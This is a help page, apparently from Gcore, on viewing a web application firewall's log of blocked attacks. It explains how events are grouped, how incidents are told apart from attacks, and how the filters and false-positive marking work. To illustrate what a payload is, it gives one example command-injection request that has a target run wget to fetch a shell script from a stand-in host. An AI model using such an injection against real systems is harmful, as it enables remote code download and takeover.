---
title: view-the-history-of-attacks-on-your-application
displayName: View events
published: true
order: 10
toc:
   --1--About the function: "about-the-function"
   --1--Why to use: "why-to-view-events"
   --1--How to use: "how-to-use-events"
   --2--Open a list of events: "open-a-list-of-events"
   --2--Filter: "apply-filters"
   --2--Mark requests as false positive: "mark-requests-as-false-positive"
---
# View the history of attacks on your application
   
## About the function

"Events" is a log that stores information about all malicious requests for your resources that were repelled by the <a href="https://gcore.com/web-security" target="_blank">Web Application Firewall (WAF)</a>. This is what the log looks like:

<img src="https://support.gcore.com/hc/article_attachments/13308735756561" alt="">

Each line in the log is called an _event_. An event is a single malicious request or several such requests connected to each other. For example, if a hacker sends one request to inject malicious code into the structure of an XML document, the log shows this as a separate event. And if a hacker makes a thousand requests to guess a password, the log groups all requests into one event with the "brute force" type of an attack. You can open such an event and view information on each of the thousand of requests.  

The WAF combines several requests into one event if they have three things in common:  

1. **Type of attack** — sqli, xss, rce, ptrav, crlf, nosqli, overlimit_res, xxe, ldapi, scanner, ssti, ssi, mail_injetion, invalid_xml, data_bomb, dirbust, brute, vpatch, infoleak or redir.  
    
2. **Payload** — part of a malicious request that contains instructions on what to do with the attacked application and helps to define the type of an attack. Example: an attacker wants to inject malicious code into your application (RCE attack) and makes the following request: *curl localhost/?23036d6ba7=%3Bwget+http%3A%2F%2Fsome_host%2Fsh311.sh*. The malicious payload is *wget+http://s*. It says to start data downloading in the application. Please note that some malicious requests have no payload, for example, behavioral attacks (different types of brute force attacks). 
3. **URL of a page or an application file** to which the request was sent.  

At the same time, an attacker's IP address and the time of requests may differ. Even if requests are sent from different IP addresses and on different days, but they use the same attack type, payload and attacked URL, they will be combined into one event.

<img src="https://support.gcore.com/hc/article_attachments/7363054594833/image_1863.png" alt="">

All events in the log are divided into two types: attacks and incidents. 

**An attack** is any malicious request. 

Not all events of the *attack* type are dangerous. Some malicious requests cannot cause damage because they target well-protected parts of an application. Your application would handle such requests even without the WAF. But other requests pose a real threat because they target vulnerabilities — if the WAF had not stopped them, they would have damaged the application. These requests are the *incidents*. 

**An incident** is a malicious request that targets a vulnerability of an application.  

When the WAF receives a malicious request, it blocks it and creates an event of the *attack* type. Then it analyses if this request targets a vulnerable part of an application or a well-protected one. If the target is a vulnerable part, the WAF creates an *incident*, if it is a well-protected one, the WAF does nothing. 

How our WAF detects vulnerabilities: 

1. From time to time, it sends different malicious test requests to check the application's response. Such requests are not dangerous, but they help to find out how the application would behave in the event of a real attack.  
    
2. When a real attack occurs, the WAF blocks it. Then the WAF copies the attacking request, cuts out the malicious part and cookies from it, and sends several similar requests to the application on its own behalf. These requests won't cause damage, but will help find out how the application would react to an attack if the WAF didn't stop it.  
    
3. It evaluates the result of the checks from Steps 1 and 2. If the requests have reached their goal, the WAF considers that there is a vulnerability; if the application's response does not indicate that it is vulnerable to an attack, then there is no vulnerability.

Example of the check: an attacker sends a request of the "open redirect" (redir) type — this type of attack changes links inside your application so that when an end-user clicks on a link, they get to a scammer’s page. The WAF detects the malicious request, cuts out cookies and the malicious part from it, and then sends several such "neutralized" requests to the application on its behalf. If the application does not deny requests, the WAF counts it as a vulnerability; if the application blocks requests, the WAF considers that there is no vulnerability. 

## Why to view "Events"?   

"Events" will show detailed information about malicious requests sent to your application. Here are three examples of when this can be useful.  

**Detect and fix vulnerabilities**. You open events of the "incident" type and see which parts of your application are vulnerable and to which types of attacks. Then you eliminate these vulnerabilities.   

**Prevent attacks from specific scammers**. With the event log, you check whether your application is frequently attacked from a specific region or from a specific IP address. Such attacks are harmless (the WAF blocks them), but your server has to process them and waste resources. To offload your server resources, you exclude attacking IP addresses or the most attacking region in the "Access Settings" according to the guide: <a href="https://gcore.com/docs/set-the-access-policy-for-a-protected-resource" target="_blank">Access Policy</a>.  

**Collect analytics data to protect the non-public part of your application**. You analyze the log of malicious requests and figure out the most common attack methods and attacking IP addresses. With this in mind, you arrange internal resources that are not protected by the WAF (for example, an application administration panel or a non-public platform for employees) so that they are protected from common types of attacks. You also block IP addresses of scammers that often send malicious requests.  

## How to use "Events"  

### Open a list of events

Go to "Events" and select which events you want to see — incidents or attacks. The list of events opens.

<img src="https://support.gcore.com/hc/article_attachments/13308771037585" alt="">

The list shows the following columns:  

- **Date** — date when the latest request of the event is received.   
- **Hits** — number of separate requests (one hit is one request) grouped inside the event.   
- **Payloads** — type of the attack.  
- **Top IP / Source** — country code to which the attacker's IP address belongs to.  If there are several addresses, the column shows the code of the country from where the most requests were sent.   
- **Domain / Path** — domain name of the application to which the request was sent, as well as the path that was requested. The last line shows the application ID from the Gcore control panel.   
- **Code** — response code returned to the malicious request.   
- **Parameter** — parameter that the malicious request contained. If a request uses an attack without an endpoint (for example, brute force attacks), the line will show the "unknown" value. 

If an event contains multiple requests, you can expand the list of all requests by clicking on the "+" icon on the left of the date. For each request, you will see general information: *date, payloads, top IP/source, domain/path, code, parameter*. Besides, there will be two additional columns: the request size and the time that the WAF spent processing the request.

### Apply filters  

To sort events, use filters.

<img src="https://support.gcore.com/hc/article_attachments/7363274806929/image_1835.png" alt="">

**Selected Types** — types of attacks. Twenty types are available: sqli, xss, rce, ptrav, crlf, nosqli, overlimit_res, xxe, ldapi, scanner, ssti, ssi, mail_injetion, invalid_xml, data_bomb, dirbust, brute, vpatch, infoleak, redir.

**Time interval** — period for which you want to view the events. You can only view events recorded for the last three months, older events are not saved.

**Application** — applications that received malicious requests. If you do not apply the filter, the log will show all requests sent to all applications of your account.

**IP** — IP addresses that have sent the requests. You can specify specific IP addresses or a range of addresses like 10.0.0.0–10.255.255.255. If you do not apply the filter, you will see events with requests sent from any IP addresses.

**Domains** — URLs of pages or files that were requested by attackers. If you don't use the filter, you will see events with the requests sent to all your domains. 

**Response Code** — response codes returned to the malicious request. If you do not use the filter, you will only see the requests that received 403 and 500 errors.

**Target** — targets of malicious requests. You can filter the attacks that targeted user data (the target is *client*), databases (the target is *database*), or a server (the target is *server*). If nothing is applied, the log will show requests to all three targets.

**Selected Countries** — countries from those requests were sent.  If you don't use the filter, requests from 249 countries will be displayed. 

### Mark requests as false positive

If the WAF has blocked a legitimate request, click the "+" icon in the event line (after clicking it will change to "–"), and then click the **Mark as false positive** button. The WAF will stop blocking such requests.

<img src="https://support.gcore.com/hc/article_attachments/13308797025553" alt="">